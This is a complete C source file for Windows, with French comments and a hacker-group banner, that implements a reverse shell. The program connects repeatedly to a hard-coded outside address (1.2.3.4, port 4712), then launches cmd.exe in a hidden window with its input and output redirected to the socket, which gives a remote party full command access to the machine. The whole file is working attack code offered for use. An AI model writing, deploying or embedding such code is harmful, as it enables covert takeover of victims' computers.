#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "Ws2_32.lib")

#define IPRECEPTEUR "1.2.3.4"
#define PORTRECEPTEUR 4712

/* _____   _   _   _____        _____   _____       ___       ___  ___
/*|  _  \ | | | | /  ___/      |_   _| | ____|     /   |     /   |/   |
/*| | | | | |_| | | |___         | |   | |__      / /| |    / /|   /| |
/*| | | | |  _  | \___  \        | |   |  __|    / / | |   / / |__/ | |
/*| |_| | | | | |  ___| |        | |   | |___   / /  | |  / /       | |
/*|_____/ |_| |_| /_____/        |_|   |_____| /_/   |_| /_/        |_|
/**********************************************************************/
/*Un reverse Shell sans pipe non plus. Http://www.dhs-team.org -b0l0k-*/
/**********************************************************************/

int main(int argc, char *argv[])
{
  struct hostent *hoste;
  char host[20];
  strcpy(host, IPRECEPTEUR);
  printf("Initialise Winsock\n");
  WSADATA wd;
  WSAStartup(MAKEWORD(1, 1), &wd);
  printf("Crée le socket\n");
  int sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
  while ((hoste = gethostbyname(host)) == NULL)
  {
    sleep(2000);
  }
  printf("DNS resolue\n");
  struct sockaddr_in sin;
  int size = sizeof(sin);
  memset(&sin, 0, sizeof(sin));
  sin.sin_family = AF_INET;
  sin.sin_port = htons(PORTRECEPTEUR);
  memcpy(&(sin.sin_addr), hoste->h_addr, hoste->h_length);
  while ((connect(sock, (struct sockaddr *)&sin, size)) < 0)
  {
    sleep(2000);
  }
  printf("Envoie le shell sur la socket\n");
  PROCESS_INFORMATION pi;
  STARTUPINFO si;
  memset(&si, 0, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
  si.wShowWindow = SW_HIDE;
  si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
  int verdict = CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, TEXT("c:\\"), &si, &pi);
  if (verdict)
    printf("Ok\n");
  else
    printf("Erreur\n");
  return 0;
}
